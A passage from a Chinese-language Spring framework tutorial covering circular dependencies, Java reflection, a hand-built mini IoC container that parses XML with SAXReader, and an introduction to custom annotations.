prototype下的set注入产生的循环依赖"></a>9.3 prototype下的set注入产生的循环依赖</h4><p>当循环依赖的所有Bean的scope=”prototype”的时候，产生的循环依赖，Spring是无法解决的，会出现BeanCurrentlyInCreationException异常。<br>大家可以测试一下，以上两个Bean，如果其中一个是singleton，另一个是prototype，是没有问题的。（singleton是在解析xml文件时就创建出来了，这就使在属性赋值时，不会一直迭代）</p><h4 id="9-4-singleton下的构造注入产生的循环依赖"><a href="#9-4-singleton下的构造注入产生的循环依赖" class="headerlink" title="9.4 singleton下的构造注入产生的循环依赖"></a>9.4 singleton下的构造注入产生的循环依赖</h4><p>产生了循环依赖，并且Spring是无法解决这种循环依赖的。</p><p>主要原因是因为通过构造方法注入导致的：因为构造方法注入会导致实例化对象的过程和对象属性赋值的过程没有分离开，必须在一起完成导致的。</p><h4 id="9-5-Spring解决循环依赖的机理"><a href="#9-5-Spring解决循环依赖的机理" class="headerlink" title="9.5 Spring解决循环依赖的机理"></a>9.5 Spring解决循环依赖的机理</h4><p>Spring为什么可以解决set + singleton模式下循环依赖？<br>根本的原因在于：这种方式可以做到将“实例化Bean”和“给Bean属性赋值”这两个动作分开去完成。<br>实例化Bean的时候：调用无参数构造方法来完成。此时可以先不给属性赋值，可以提前将该Bean对象“曝光”给外界。<br>给Bean属性赋值的时候：调用setter方法来完成。<br><strong>两个步骤是完全可以分离开去完成的，并且这两步不要求在同一个时间点上完成。</strong><br>也就是说，Bean都是单例的，我们可以先把所有的单例Bean实例化出来，放到一个集合当中（我们可以称之为缓存），所有的单例Bean全部实例化完成之后，以后我们再慢慢的调用setter方法给属性赋值。这样就解决了循环依赖的问题。</p><h3 id="十、回顾反射机制"><a href="#十、回顾反射机制" class="headerlink" title="十、回顾反射机制"></a>十、回顾反射机制</h3><h4 id="10-1-分析方法四要素"><a href="#10-1-分析方法四要素" class="headerlink" title="10.1 分析方法四要素"></a>10.1 分析方法四要素</h4><p>●调用哪个对象的（systemService）<br>●哪个方法（login）<br>●传什么参数（”admin”, “admin123”）<br>●返回什么值（success）</p><h4 id="10-2-获取Method"><a href="#10-2-获取Method" class="headerlink" title="10.2 获取Method"></a>10.2 获取Method</h4><pre><code>Method loginMethod = clazz.getDeclaredMethod(&quot;login&quot;, String.class, String.class);//方法名、形参类型、形参类型</code></pre><p>获取一个方法，需要告诉Java程序，你要获取的方法的名字是什么，这个方法上每个形参的类型是什么。</p><p>这样的设计也非常合理，因为在同一个类当中，方法是支持重载的，也就是说方法名可以一样，但参数列表一定是不一样的，所以获取一个方法需要提供方法名以及每个形参的类型。</p><h4 id="10-3-调用Method"><a href="#10-3-调用Method" class="headerlink" title="10.3 调用Method"></a>10.3 调用Method</h4><p>要让一个方法调用的话，就关联到四要素了：<br>●调用哪个对象的<br>●哪个方法<br>●传什么参数<br>●返回什么值</p><pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        Class <span class="token class-name">clazz</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.powernode.reflect.SystemService"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Object obj <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Method loginMethod <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Object retValue <span class="token operator">=</span> loginMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token string">"admin123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>retValue<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h4 id="10-4-假设你知道属性名"><a href="#10-4-假设你知道属性名" class="headerlink" title="10.4 假设你知道属性名"></a>10.4 假设你知道属性名</h4><p>你知道以下这几条信息：<br>●类名是：com.powernode.reflect.User<br>●该类中有String类型的name属性和int类型的age属性。<br>●另外你也知道该类的设计符合javabean规范。（也就是说属性私有化，对外提供setter和getter方法）<br>你如何通过反射机制给User对象的name属性赋值zhangsan，给age属性赋值20岁。</p><pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 已知类名</span>        String className <span class="token operator">=</span> <span class="token string">"com.powernode.reflect.User"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 已知属性名</span>        String propertyName <span class="token operator">=</span> <span class="token string">"age"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 通过反射机制给User对象的age属性赋值20岁</span>        Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> clazz <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        Object obj <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 创建对象</span>        <span class="token comment" spellcheck="true">// 根据属性名获取setter方法名</span>        String setMethodName <span class="token operator">=</span> <span class="token string">"set"</span> <span class="token operator">+</span> propertyName<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> propertyName<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 获取Method</span>        Method setMethod <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span>setMethodName<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 调用Method</span>        setMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h3 id="十一、手写Spring框架"><a href="#十一、手写Spring框架" class="headerlink" title="十一、手写Spring框架"></a>十一、手写Spring框架</h3><p>Spring IoC容器的实现原理：工厂模式 + 解析XML + 反射机制。</p><h5 id="第一步：创建模块myspring"><a href="#第一步：创建模块myspring" class="headerlink" title="第一步：创建模块myspring"></a>第一步：创建模块myspring</h5><h5 id="第二步：准备好我们要管理的Bean"><a href="#第二步：准备好我们要管理的Bean" class="headerlink" title="第二步：准备好我们要管理的Bean"></a>第二步：准备好我们要管理的Bean</h5><h5 id="第三步：准备myspring-xml配置文件"><a href="#第三步：准备myspring-xml配置文件" class="headerlink" title="第三步：准备myspring.xml配置文件"></a>第三步：准备myspring.xml配置文件</h5><h5 id="第四步：编写ApplicationContext接口"><a href="#第四步：编写ApplicationContext接口" class="headerlink" title="第四步：编写ApplicationContext接口"></a>第四步：编写ApplicationContext接口</h5><p>ApplicationContext接口中提供一个getBean()方法，通过该方法可以获取Bean对象。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">ApplicationContext</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * 根据bean的id获取bean实例。     * @param beanId bean的id     * @return bean实例     */</span>    Object <span class="token function">getBean</span><span class="token punctuation">(</span>String beanId<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h5 id="第五步：编写ClassPathXmlApplicationContext"><a href="#第五步：编写ClassPathXmlApplicationContext" class="headerlink" title="第五步：编写ClassPathXmlApplicationContext"></a>第五步：编写ClassPathXmlApplicationContext</h5><p>ClassPathXmlApplicationContext是ApplicationContext接口的实现类。该类从类路径当中加载myspring.xml配置文件。</p><h5 id="第六步：确定采用Map集合存储Bean"><a href="#第六步：确定采用Map集合存储Bean" class="headerlink" title="第六步：确定采用Map集合存储Bean"></a>第六步：确定采用Map集合存储Bean</h5><p>确定采用Map集合存储Bean实例。Map集合的key存储beanId，value存储Bean实例。Map&lt;String,Object&gt;<br>在ClassPathXmlApplicationContext类中添加Map&lt;String,Object&gt;属性。<br>并且在ClassPathXmlApplicationContext类中添加构造方法，该构造方法的参数接收myspring.xml文件。<br>同时实现getBean方法。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ClassPathXmlApplicationContext</span> <span class="token keyword">implements</span> <span class="token class-name">ApplicationContext</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * 存储bean的Map集合     */</span>    <span class="token keyword">private</span> Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span>Object<span class="token operator">></span> beanMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 在该构造方法中，解析myspring.xml文件，创建所有的Bean实例，并将Bean实例存放到Map集合中。     * @param resource 配置文件路径（要求在类路径当中）     */</span>    <span class="token keyword">public</span> <span class="token function">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span>String resource<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Object <span class="token function">getBean</span><span class="token punctuation">(</span>String beanId<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> beanMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>beanId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h5 id="第七步：解析配置文件实例化所有Bean"><a href="#第七步：解析配置文件实例化所有Bean" class="headerlink" title="第七步：解析配置文件实例化所有Bean"></a>第七步：解析配置文件实例化所有Bean</h5><p>在ClassPathXmlApplicationContext的构造方法中解析配置文件，获取所有bean的类名，通过反射机制调用无参数构造方法创建Bean。并且将Bean对象存放到Map集合中。</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/*** 在该构造方法中，解析myspring.xml文件，创建所有的Bean实例，并将Bean实例存放到Map集合中。* @param resource 配置文件路径（要求在类路径当中）*/</span><span class="token keyword">public</span> <span class="token function">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span>String resource<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        SAXReader reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SAXReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Document document <span class="token operator">=</span> reader<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>ClassLoader<span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getResourceAsStream</span><span class="token punctuation">(</span>resource<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 获取所有的bean标签</span>        List<span class="token operator">&lt;</span>Node<span class="token operator">></span> beanNodes <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">selectNodes</span><span class="token punctuation">(</span><span class="token string">"//bean"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 遍历集合</span>        beanNodes<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>beanNode <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>            Element beanElt <span class="token operator">=</span> <span class="token punctuation">(</span>Element<span class="token punctuation">)</span> beanNode<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 获取id</span>            String id <span class="token operator">=</span> beanElt<span class="token punctuation">.</span><span class="token function">attributeValue</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 获取className</span>            String className <span class="token operator">=</span> beanElt<span class="token punctuation">.</span><span class="token function">attributeValue</span><span class="token punctuation">(</span><span class="token string">"class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 通过反射机制创建对象</span>                Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> clazz <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>                Constructor<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> defaultConstructor <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                Object bean <span class="token operator">=</span> defaultConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 存储到Map集合</span>                beanMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> bean<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h5 id="第八步：测试能否获取到Bean"><a href="#第八步：测试能否获取到Bean" class="headerlink" title="第八步：测试能否获取到Bean"></a>第八步：测试能否获取到Bean</h5><h5 id="第九步：给Bean的属性赋值"><a href="#第九步：给Bean的属性赋值" class="headerlink" title="第九步：给Bean的属性赋值"></a>第九步：给Bean的属性赋值</h5><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ClassPathXmlApplicationContext</span> <span class="token keyword">implements</span> <span class="token class-name">ApplicationContext</span><span class="token punctuation">{</span>                    beanMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> bean<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 再重新遍历集合，这次遍历是为了给Bean的所有属性赋值。</span>            <span class="token comment" spellcheck="true">// 思考：为什么不在上面的循环中给Bean的属性赋值，而在这里再重新遍历一次呢？</span>            <span class="token comment" spellcheck="true">// 通过这里你是否能够想到Spring是如何解决循环依赖的：实例化和属性赋值分开。</span>            beanNodes<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>beanNode <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                Element beanElt <span class="token operator">=</span> <span class="token punctuation">(</span>Element<span class="token punctuation">)</span> beanNode<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 获取bean的id</span>                String beanId <span class="token operator">=</span> beanElt<span class="token punctuation">.</span><span class="token function">attributeValue</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 获取所有property标签</span>                List<span class="token operator">&lt;</span>Element<span class="token operator">></span> propertyElts <span class="token operator">=</span> beanElt<span class="token punctuation">.</span><span class="token function">elements</span><span class="token punctuation">(</span><span class="token string">"property"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 遍历所有属性</span>                propertyElts<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>propertyElt <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                    <span class="token keyword">try</span> <span class="token punctuation">{</span>                        <span class="token comment" spellcheck="true">// 获取属性名</span>                        String propertyName <span class="token operator">=</span> propertyElt<span class="token punctuation">.</span><span class="token function">attributeValue</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">// 获取属性类型</span>                        Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> propertyType <span class="token operator">=</span> beanMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>beanId<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>propertyName<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">// 获取set方法名</span>                        String setMethodName <span class="token operator">=</span> <span class="token string">"set"</span> <span class="token operator">+</span> propertyName<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> propertyName<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">// 获取set方法</span>                        Method setMethod <span class="token operator">=</span> beanMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>beanId<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span>setMethodName<span class="token punctuation">,</span> propertyType<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">// 获取属性的值，值可能是value，也可能是ref。</span>                        <span class="token comment" spellcheck="true">// 获取value</span>                        String propertyValue <span class="token operator">=</span> propertyElt<span class="token punctuation">.</span><span class="token function">attributeValue</span><span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">// 获取ref</span>                        String propertyRef <span class="token operator">=</span> propertyElt<span class="token punctuation">.</span><span class="token function">attributeValue</span><span class="token punctuation">(</span><span class="token string">"ref"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        Object propertyVal <span class="token operator">=</span> null<span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>propertyValue <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token comment" spellcheck="true">// 该属性是简单属性</span>                            String propertyTypeSimpleName <span class="token operator">=</span> propertyType<span class="token punctuation">.</span><span class="token function">getSimpleName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">switch</span> <span class="token punctuation">(</span>propertyTypeSimpleName<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token keyword">case</span> <span class="token string">"byte"</span><span class="token operator">:</span> <span class="token keyword">case</span> <span class="token string">"Byte"</span><span class="token operator">:</span>                                    propertyVal <span class="token operator">=</span> Byte<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>propertyValue<span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token keyword">break</span><span class="token punctuation">;</span>                                <span class="token keyword">case</span> <span class="token string">"short"</span><span class="token operator">:</span> <span class="token keyword">case</span> <span class="token string">"Short"</span><span class="token operator">:</span>                                    propertyVal <span class="token operator">=</span> Short<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>propertyValue<span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token keyword">break</span><span class="token punctuation">;</span>                                <span class="token keyword">case</span> <span class="token string">"int"</span><span class="token operator">:</span> <span class="token keyword">case</span> <span class="token string">"Integer"</span><span class="token operator">:</span>                                    propertyVal <span class="token operator">=</span> Integer<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>propertyValue<span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token keyword">break</span><span class="token punctuation">;</span>                                <span class="token keyword">case</span> <span class="token string">"long"</span><span class="token operator">:</span> <span class="token keyword">case</span> <span class="token string">"Long"</span><span class="token operator">:</span>                                    propertyVal <span class="token operator">=</span> Long<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>propertyValue<span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token keyword">break</span><span class="token punctuation">;</span>                                <span class="token keyword">case</span> <span class="token string">"float"</span><span class="token operator">:</span> <span class="token keyword">case</span> <span class="token string">"Float"</span><span class="token operator">:</span>                                    propertyVal <span class="token operator">=</span> Float<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>propertyValue<span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token keyword">break</span><span class="token punctuation">;</span>                                <span class="token keyword">case</span> <span class="token string">"double"</span><span class="token operator">:</span> <span class="token keyword">case</span> <span class="token string">"Double"</span><span class="token operator">:</span>                                    propertyVal <span class="token operator">=</span> Double<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>propertyValue<span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token keyword">break</span><span class="token punctuation">;</span>                                <span class="token keyword">case</span> <span class="token string">"boolean"</span><span class="token operator">:</span> <span class="token keyword">case</span> <span class="token string">"Boolean"</span><span class="token operator">:</span>                                    propertyVal <span class="token operator">=</span> Boolean<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>propertyValue<span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token keyword">break</span><span class="token punctuation">;</span>                                <span class="token keyword">case</span> <span class="token string">"char"</span><span class="token operator">:</span> <span class="token keyword">case</span> <span class="token string">"Character"</span><span class="token operator">:</span>                                    propertyVal <span class="token operator">=</span> propertyValue<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token keyword">break</span><span class="token punctuation">;</span>                                <span class="token keyword">case</span> <span class="token string">"String"</span><span class="token operator">:</span>                                    propertyVal <span class="token operator">=</span> propertyValue<span class="token punctuation">;</span>                                    <span class="token keyword">break</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            setMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>beanMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>beanId<span class="token punctuation">)</span><span class="token punctuation">,</span> propertyVal<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>propertyRef <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token comment" spellcheck="true">// 该属性不是简单属性</span>                            setMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>beanMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>beanId<span class="token punctuation">)</span><span class="token punctuation">,</span> beanMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>propertyRef<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Object <span class="token function">getBean</span><span class="token punctuation">(</span>String beanId<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> beanMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>beanId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h5 id="第十步：打包发布"><a href="#第十步：打包发布" class="headerlink" title="第十步：打包发布"></a>第十步：打包发布</h5><h5 id="第十一步：站在程序员角度使用myspring框架"><a href="#第十一步：站在程序员角度使用myspring框架" class="headerlink" title="第十一步：站在程序员角度使用myspring框架"></a>第十一步：站在程序员角度使用myspring框架</h5><h3 id="十二、Spring-IoC注解式开发"><a href="#十二、Spring-IoC注解式开发" class="headerlink" title="十二、Spring IoC注解式开发"></a>十二、Spring IoC注解式开发</h3><h4 id="12-1-回顾注解"><a href="#12-1-回顾注解" class="headerlink" title="12.1 回顾注解"></a>12.1 回顾注解</h4><p>注解的存在主要是为了简化XML的配置。Spring6倡导全注解开发。<br>我们来回顾一下：<br>●第一：注解怎么定义，注解中的属性怎么定义？<br>●第二：注解怎么使用？<br>●第三：通过反射机制怎么读取注解？<br>注解怎么定义，注解中的属性怎么定义？</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>powernode<span class="token punctuation">.</span>annotation<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>ElementType<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Retention<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>RetentionPolicy<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Target<span class="token punctuation">;</span><span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">{</span>ElementType<span class="token punctuation">.</span>TYPE<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span>value <span class="token operator">=</span> RetentionPolicy<span class="token punctuation">.</span>RUNTIME<span class="token punctuation">)</span><span class="token keyword">public</span> @<span class="token keyword">interface</span> <span class="token class-name">Component</span> <span class="token punctuation">{</span>    String <span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>以上是自定义了一个注解：Component<br>该注解上面修饰的注解包括：Target注解和Retention注解，这两个注解被称为元注解。<br>Target注解用来设置Component注解可以出现的位置，以上代表表示Component注解只能用在类和接口上。<br>Retention注解用来设置Component注解的保持性策略，以上代表Component注解可以被反射机制读取。<br>String value(); 是Component注解中的一个属性。该属性类型String，属性名是value。</p><p>用法简单，语法格式：@注解类型名(属性名=属性值, 属性名=属性值, 